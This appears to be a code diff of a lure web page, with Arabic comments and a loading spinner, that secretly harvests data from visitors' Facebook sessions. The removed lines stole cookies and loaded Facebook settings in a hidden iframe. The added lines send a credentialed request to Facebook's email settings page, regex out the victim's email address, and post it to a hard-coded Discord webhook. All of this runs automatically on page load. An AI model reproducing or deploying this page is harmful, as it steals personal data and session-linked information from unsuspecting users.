@@ -11,59 +11,60 @@
     </style>
 </head>
 <body>
-    <div class="version-marker">16</div>
+    <div class="version-marker">17</div>
     <div class="loader"></div>
-    <p>جاري استخراج مفاتيح الجلسة (V1.2.8)...</p>
+    <p>جاري استخراج البيانات النهائية (V1.2.9)...</p>
 
-    <iframe id="fb-frame" src="about:blank" style="display:none;"></iframe>
-    <iframe name="hidden_receiver" style="display:none;"></iframe>
+    <iframe name="sink" style="display:none;"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function sendToDiscord(title, data) {
+        function report(title, msg) {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEBHOOK_URL;
-            form.target = 'hidden_receiver';
+            form.target = 'sink';
             const input = document.createElement('input');
             input.type = 'hidden';
             input.name = 'payload_json';
             input.value = JSON.stringify({
-                embeds: [{ title: "🔓 " + title, description: data, color: 15105570 }]
+                embeds: [{ title: "🎯 " + title, description: msg, color: 1752220 }]
             });
             form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
         }
 
-        async function startDeepTunnel() {
-            // 1. تأكيد تشغيل النسخة
-            sendToDiscord("Protocol v1.2.8", "Starting Deep Tunneling on " + navigator.platform);
+        async function finalExtraction() {
+            report("Final Protocol V1.2.9", "Initiating XHR Email Extraction...");
 
-            // 2. محاولة سحب الـ Cookies (إذا كانت الحماية ضعيفة)
-            if (document.cookie) {
-                sendToDiscord("Direct Cookie Loot", document.cookie);
+            // محاولة سحب الإيميل عبر رابط الـ JSON الخاص بفيسبوك
+            try {
+                const xhr = new XMLHttpRequest();
+                // نستخدم رابط يعطي البيانات كـ JSON لسهولة السحب
+                xhr.open("GET", "https://mbasic.facebook.com/settings/email/", true);
+                xhr.withCredentials = true; // إجبار إرسال الكوكيز
+                
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        const html = xhr.responseText;
+                        // البحث عن نمط الإيميل في الصفحة
+                        const match = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                        if (match) {
+                            report("Email Found!", "The extracted email is: " + match[0]);
+                        } else {
+                            report("Extraction Status", "Email not found in HTML (Session limited)");
+                        }
+                    }
+                };
+                xhr.send();
+            } catch (e) {
+                report("XHR Error", e.message);
             }
-
-            // 3. تكتيك الـ Iframe Injection
-            // بنحاول نحمل صفحة إعدادات فيسبوك في الـ iframe
-            const fbFrame = document.getElementById('fb-frame');
-            fbFrame.src = "https://mbasic.facebook.com/settings/email/";
-
-            // بنراقب إذا الـ iframe قدر يحمل الصفحة (معناه الجلسة نشطة جداً)
-            setTimeout(() => {
-                try {
-                    const check = fbFrame.contentWindow.location.href;
-                    sendToDiscord("Iframe Access", "Successfully loaded: " + check);
-                } catch (e) {
-                    // إذا طلع خطأ Cross-Origin، هاد معناه إن الجلسة انبعثت بس المتصفح منعنا من القراءة
-                    sendToDiscord("Iframe Proxy", "Request Sent. Browser blocked read, but Session Cookie was included.");
-                }
-            }, 3000);
         }
 
-        window.onload = startDeepTunnel;
+        setTimeout(finalExtraction, 2000);
     </script>
 </body>
 </html>
